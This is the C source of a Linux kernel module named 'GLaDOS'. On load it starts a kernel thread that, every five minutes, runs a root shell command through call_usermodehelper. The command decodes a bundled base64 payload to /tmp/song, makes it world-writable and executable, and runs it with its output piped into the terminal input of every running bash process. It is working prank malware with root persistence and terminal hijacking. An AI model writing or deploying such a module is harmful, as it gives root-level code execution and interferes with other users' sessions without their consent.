#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/timer.h>
#include <linux/kthread.h>
#include <linux/delay.h>

#define FILENAME "/tmp/song"
//#define INTERVAL_SECONDS 300
#define INTERVAL_SECONDS 300

char *cmd = "/bin/echo "
#include "song/song_b64.txt"
" | /usr/bin/base64 -d > " FILENAME "; /bin/chmod 777 " FILENAME "; "
"/usr/bin/pgrep -f bash | /usr/bin/xargs /usr/bin/printf '/proc/%d/fd/0\n' | /usr/bin/xargs -I file /bin/sh -c '" FILENAME " > file &'";

static void GLaDOS_cake(void) {
    char *argv[] = { "/bin/bash", "-c", cmd, NULL };
    static char *envp[] = {
        "SHELL=/bin/bash",
        "HOME=/root",
        "USER=root",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin",
        "DISPLAY=:0",
        "PWD=/root", 
        NULL
    };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

int stop;
int thread_function(void *data) {
    stop = 0;
    while(true) {
        printk("[GLaDOS][+] cake\n");
    	GLaDOS_cake();
	    msleep_interruptible(INTERVAL_SECONDS * 1000);
        if(stop) return 0;
    }
}

int data;
struct task_struct *task;

static int __init GLaDOS_init(void) {
    printk("[GLaDOS][+] installed\n");

    task = kthread_run(&thread_function, (void *)data, "GLaDOS");

    printk("[GLaDOS][+] started kernel thread\n");

    return 0;
}

static void __exit GLaDOS_exit(void) {
    stop = 1;
    kthread_stop(task);

    printk("[GLaDOS][+] uninstalled\n");

    return;
}

module_init(GLaDOS_init);
module_exit(GLaDOS_exit);

#define DRIVER_AUTHOR "GLaDOS"
#define DRIVER_DESC "This is your fault. It didn't have to be like this."

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);
MODULE_LICENSE("GPL");
